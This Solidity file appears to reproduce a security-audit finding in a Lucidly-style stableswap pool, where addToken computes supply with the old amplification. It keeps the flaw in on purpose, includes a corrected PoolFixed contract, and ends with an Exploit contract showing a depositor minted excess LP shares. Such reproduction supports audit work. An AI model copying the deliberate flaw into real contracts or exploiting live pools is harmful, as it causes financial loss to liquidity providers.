// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Lucidly Pool.addToken — supply is updated with the old amplification
    (Pashov Audit Group, Lucidly security review, finding H-13).

    SYNTHETIC, cheatcode-free reduction. Rates are 1 so a token amount is its
    virtual balance. Weights stay equal, and each weight * n equals 1, so the
    yETH product power is the identity. The supply iteration is the yETH
    _calc_supply step the report points at:

        D' = (A * sigma - D * pi) / (A - 1)

    addToken is supposed to pass amplification_, the new A f^n. It passes the
    stored amplification instead. totalSupply after the add is short, and the
    next depositor is minted that shortfall as extra LP. */

contract LpToken {
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function setMinter(address minter_) external {
        require(minter == address(0), "minter");
        minter = minter_;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract Pool {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant MAX_POW_REL_ERR = 100;
    uint256 internal constant OLD_AMPLIFICATION = 256 * 1e18;

    LpToken public lp;
    address public owner;
    uint256 public amplification;
    uint256 public supply;
    uint256 public numTokens;
    uint256[] internal virtualBalances;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor(LpToken lp_) {
        lp = lp_;
        owner = msg.sender;
        lp.setMinter(address(this));
    }

    function virtualSum() public view returns (uint256 sum) {
        uint256 n = numTokens;
        for (uint256 i; i < n; ++i) sum += virtualBalances[i];
    }

    function _prodSum() internal view returns (uint256 prod, uint256 sum) {
        uint256 n = numTokens;
        uint256 w = PRECISION / n;
        sum = virtualSum();
        prod = PRECISION;
        for (uint256 i; i < n; ++i) {
            uint256 term = sum * w / virtualBalances[i];
            prod = prod * term / PRECISION;
        }
    }

    function _calculateSupply(
        uint256 numTokens_,
        uint256 supply_,
        uint256 amplification_,
        uint256 vbProd_,
        uint256 vbSum_,
        bool up_
    ) internal pure returns (uint256, uint256) {
        uint256 l = amplification_;
        uint256 d = l - PRECISION;
        l = l * vbSum_;
        uint256 s = supply_;
        uint256 r = vbProd_;
        for (uint256 iter; iter < 255; ++iter) {
            uint256 sp = (l - s * r) / d;
            for (uint256 i; i < numTokens_; ++i) r = r * sp / s;
            uint256 delta = sp >= s ? sp - s : s - sp;
            if (delta * PRECISION / s <= MAX_POW_REL_ERR) {
                uint256 adj = sp * MAX_POW_REL_ERR / PRECISION;
                if (up_) sp += adj;
                else sp -= adj;
                return (sp, r);
            }
            s = sp;
        }
        revert("no convergence");
    }

    function seed(uint256 b0, uint256 b1, uint256 b2, uint256 b3, address genesis) external onlyOwner {
        require(numTokens == 0, "seeded");
        virtualBalances.push(b0);
        virtualBalances.push(b1);
        virtualBalances.push(b2);
        virtualBalances.push(b3);
        numTokens = 4;
        amplification = OLD_AMPLIFICATION;
        (uint256 prod, uint256 sum) = _prodSum();
        (supply, prod) = _calculateSupply(numTokens, sum, amplification, prod, sum, true);
        lp.mint(genesis, supply);
    }

    function addToken(uint256 amount, uint256 amplification_, address receiver) external virtual onlyOwner {
        virtualBalances.push(amount);
        numTokens += 1;
        uint256 _numTokens = numTokens;
        (uint256 _virtualBalanceProd, uint256 _virtualBalanceSum) = _prodSum();
        uint256 prev = supply;
        uint256 __supply;
        // @> VULN: amplification_ is the new pool state, but the supply update reads amplification
        (__supply, _virtualBalanceProd) = _calculateSupply(_numTokens, _virtualBalanceSum, amplification, _virtualBalanceProd, _virtualBalanceSum, true);
        // FIX: pass amplification_ into _calculateSupply
        amplification = amplification_;
        supply = __supply;
        lp.mint(receiver, __supply - prev);
    }

    function quoteSupply(uint256 amplification_) external view returns (uint256 quoted) {
        (uint256 prod, uint256 sum) = _prodSum();
        (quoted,) = _calculateSupply(numTokens, sum, amplification_, prod, sum, true);
    }

    function deposit(uint256 index, uint256 amount, address receiver) external returns (uint256 minted) {
        virtualBalances[index] += amount;
        (uint256 prod, uint256 sum) = _prodSum();
        uint256 prev = supply;
        uint256 nextSupply;
        (nextSupply, prod) = _calculateSupply(numTokens, sum, amplification, prod, sum, false);
        minted = nextSupply - prev;
        supply = nextSupply;
        lp.mint(receiver, minted);
    }
}

contract PoolFixed is Pool {
    constructor(LpToken lp_) Pool(lp_) {}

    function addToken(uint256 amount, uint256 amplification_, address receiver) external override onlyOwner {
        virtualBalances.push(amount);
        numTokens += 1;
        uint256 _numTokens = numTokens;
        (uint256 _virtualBalanceProd, uint256 _virtualBalanceSum) = _prodSum();
        uint256 prev = supply;
        uint256 __supply;
        (__supply, _virtualBalanceProd) = _calculateSupply(_numTokens, _virtualBalanceSum, amplification_, _virtualBalanceProd, _virtualBalanceSum, true);
        amplification = amplification_;
        supply = __supply;
        lp.mint(receiver, __supply - prev);
    }
}

contract Exploit {
    address public constant USER = 0x2222222222222222222222222222222222222222;
    address public constant GENESIS = 0x3333333333333333333333333333333333333333;

    uint256 public constant SUPPLY_SHORTFALL = 4187399816552179222;
    uint256 public constant USER_SHARES = 103979436279176422035;
    uint256 public constant FAIR_USER_SHARES = 99792036462624242813;
    uint256 public constant PRICE_GAP = 8052482328780901;
    uint256 public constant ADDER_LP = 21604028390740156610;

    LpToken public lp;
    Pool public pool;
    uint256 public wrongSupply;
    uint256 public fairSupply;
    uint256 public userShares;
    uint256 public fairUserShares;
    uint256 public priceGap;

    constructor() {
        lp = new LpToken();
        pool = new Pool(lp);
    }

    function run() external {
        pool.seed(100 ether, 50 ether, 150 ether, 200 ether, GENESIS);
        pool.addToken(25 ether, 3125 ether, address(this));
        wrongSupply = pool.supply();
        fairSupply = pool.quoteSupply(3125 ether);
        uint256 sum = pool.virtualSum();
        uint256 wrongPrice = sum * 1e18 / wrongSupply;
        uint256 fairPrice = sum * 1e18 / fairSupply;
        priceGap = wrongPrice - fairPrice;
        pool.deposit(0, 100 ether, USER);
        userShares = lp.balanceOf(USER);
        fairUserShares = pool.supply() - fairSupply;
        require(fairSupply - wrongSupply == SUPPLY_SHORTFALL, "supply");
        require(priceGap == PRICE_GAP, "price");
        require(lp.balanceOf(address(this)) == ADDER_LP, "adder");
        require(userShares == USER_SHARES, "user");
        require(userShares - fairUserShares == SUPPLY_SHORTFALL, "extra");
        require(fairUserShares == FAIR_USER_SHARES, "fair shares");
    }
}
